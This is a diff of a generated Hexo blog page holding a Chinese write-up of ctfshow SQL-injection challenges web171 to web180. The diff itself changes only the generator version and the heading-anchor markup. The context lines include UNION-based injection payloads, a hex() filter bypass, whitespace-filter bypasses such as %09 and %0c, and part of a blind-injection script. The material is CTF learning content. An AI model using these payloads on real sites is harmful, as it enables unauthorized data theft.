@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 6.1.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 
@@ -505,7 +505,7 @@
 <p>专题训练之 SQL 注入</p>
 <span id="more"></span>
 
-<h2 id="sql-zhu-ru"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入<a href="#sql-zhu-ru" class="header-anchor">#</a></h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171<a href="#web171" class="header-anchor">#</a></h3><p>页面已经回显了 sql 语句</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>页面已经回显了 sql 语句</p>
 <pre class="line-numbers language-none"><code class="language-none">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>存在字符型注入，闭合方式是单引号。</p>
@@ -523,7 +523,7 @@ id,username,password
 ctfshow&#123;1e45dfa5-7de2-4046-8028-656e0fde7e3f&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172<a href="#web172" class="header-anchor">#</a></h3><p>和上题几乎一模一样，但是 flag 并不在 ctfshow_user 表中,以及 username 不能等于 flag，这个并不影响到我们，毕竟我们把多行返回的数据拼成了一行(●’◡’●)</p>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>和上题几乎一模一样，但是 flag 并不在 ctfshow_user 表中,以及 username 不能等于 flag，这个并不影响到我们，毕竟我们把多行返回的数据拼成了一行(●’◡’●)</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
 $sql &#x3D; &quot;select username,password from ctfshow_user2 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
 &#x2F;&#x2F;检查结果是否有flag
@@ -540,7 +540,7 @@ if($row-&gt;username!&#x3D;&#x3D;&#39;flag&#39;)&#123;
 <p>后面发现有一个 ctfshow_user2 表，flag 就在这个表里</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39; union select 1,2,group_concat(id,username,password) from ctfshow_user2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173<a href="#web173" class="header-anchor">#</a></h3><p>和上题几乎一模一样，但是 flag 又换了一个表。同时这是一个有过滤的字符型注入，添加了检查结果中是否匹配正则表达式 <code>/flag/i</code> ，</p>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>和上题几乎一模一样，但是 flag 又换了一个表。同时这是一个有过滤的字符型注入，添加了检查结果中是否匹配正则表达式 <code>/flag/i</code> ，</p>
 <pre class="line-numbers language-none"><code class="language-none">
 &#x2F;&#x2F;拼接sql语句查找指定ID用户
 $sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
@@ -557,7 +557,7 @@ if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;
 <p>添加hex函数绕过正则过滤</p>
 <pre class="line-numbers language-none"><code class="language-none">0&#39; union select 1,2,hex((select password from ctfshow_user where username&#x3D;&#39;flag&#39;)) %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174<a href="#web174" class="header-anchor">#</a></h3><p>和前几题的查询语句一样，但是在回显的时候不能出现 flag 字符和数字</p>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><p>和前几题的查询语句一样，但是在回显的时候不能出现 flag 字符和数字</p>
 <p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119210952941.png" alt="image-20230119210952941"></p>
 <p>不幸地是，这两种编码都会包含到数字，所以这题我们不能采用联合注入了，要使用盲注。注意查询的时候访问的是 v4.php </p>
 <p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119212900435.png" alt="image-20230119212900435"></p>
@@ -596,7 +596,7 @@ while True:
     print(f&quot;[*] flag: &#123;flag&#125;&quot;)
     index +&#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175<a href="#web175" class="header-anchor">#</a></h3><p>平台说这是最后一个无过滤的 sql 注入~ 但是为什么回显还是有过滤？？</p>
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>平台说这是最后一个无过滤的 sql 注入~ 但是为什么回显还是有过滤？？</p>
 <p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119213646569.png" alt="image-20230119213646569"></p>
 <p>过滤了 ascii 0-127,相当于没有回显，所以改上题的布尔盲注为时间盲注，同样查询语句是在 v5.php！</p>
 <p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119213755279.png" alt="image-20230119213755279"></p>
@@ -639,7 +639,7 @@ while True:
 <blockquote>
 <p>以下题目开始过滤啦</p>
 </blockquote>
-<h3 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h3><p>以下题目大都过滤了空格，一般代替空格的字符串有</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以下题目大都过滤了空格，一般代替空格的字符串有</p>
 <ul>
 <li>%09</li>
 <li>%0a</li>
@@ -647,11 +647,11 @@ while True:
 <li>%0d</li>
 <li>%0c</li>
 </ul>
-<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176<a href="#web176" class="header-anchor">#</a></h3><p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119215933306.png" alt="image-20230119215933306"></p>
+<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119215933306.png" alt="image-20230119215933306"></p>
 <p>这里其实是对 select 进行了过滤，大小写就能绕过。但是也可以如下拿 flag</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39;or&#39;1&#39;&#x3D;&#39;1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177<a href="#web177" class="header-anchor">#</a></h3><p>这里应该是过滤掉了空格，只要存在空格就把整个语句都清空。用 <code>%09</code> 替代空格即可</p>
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>这里应该是过滤掉了空格，只要存在空格就把整个语句都清空。用 <code>%09</code> 替代空格即可</p>
 <p>踩坑点：</p>
 <p>使用 –+ 作为注释符会失效，因为最后的 + 在url解码后被识别为空格，然后触发了题目的 waf</p>
 <p>所以可以将 # 编码为 %23 来作为注释符，不编码的话 # 在url中有特殊含义会有些问题</p>
@@ -659,7 +659,7 @@ while True:
 
 
 
-<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178<a href="#web178" class="header-anchor">#</a></h3><p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120085243761.png" alt="image-20230120085243761"></p>
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120085243761.png" alt="image-20230120085243761"></p>
 <p>依旧过滤了空格，上一题的答案还能用。不知道为什么这样的语句行不通，所以具体过滤了什么呢？</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39;%09union%09select%091,2,(group_concat(password)%09from%09ctfshow_user)%23 &#x2F;&#x2F;这样不行
 1&#39;%09union%09select%091,2,group_concat(id,password)from%09ctfshow_user%23 &#x2F;&#x2F;这样可以
@@ -669,17 +669,17 @@ while True:
 <p>但是上题答案可以</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09&#x3D;%09&#39;flag&#39;)%09%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179<a href="#web179" class="header-anchor">#</a></h3><p>依旧是过滤了空格，但是现在 %09 不好用啦。但是可以用 %0c 代替空格</p>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>依旧是过滤了空格，但是现在 %09 不好用啦。但是可以用 %0c 代替空格</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39;%0cunion%0cselect%0c1,2,group_concat(id,password)%0cfrom%0cctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180<a href="#web180" class="header-anchor">#</a></h3><p>这一关过滤了注释符 %23,而且空格还是只能用 %0c 代替。那我们只能使用另一个注释符–空格了，将空格替换成 %0c 就好</p>
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>这一关过滤了注释符 %23,而且空格还是只能用 %0c 代替。那我们只能使用另一个注释符–空格了，将空格替换成 %0c 就好</p>
 <p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120092708256.png" alt="image-20230120092708256"></p>
 <p>一开始是想在联合查询的最后一个字符左边加上单引号，然后和题目的单引号形成一个完整的单引号以此绕过过滤的。</p>
 <pre class="line-numbers language-none"><code class="language-none">1&#39; union select 1,2,&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>但是发现 group_conat 语句只能在联合查询的最后一个位置，不知道为什么</p>
 <p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120093917720.png" alt="image-20230120093917720"></p>
-<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园 (cnblogs.com)</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50589021/article/details/119426002">(10条消息) ctfshow-sql注入-超详解(172-200)_Yn8rt的博客-CSDN博客_ctfshow sql</a></p>
 
                 
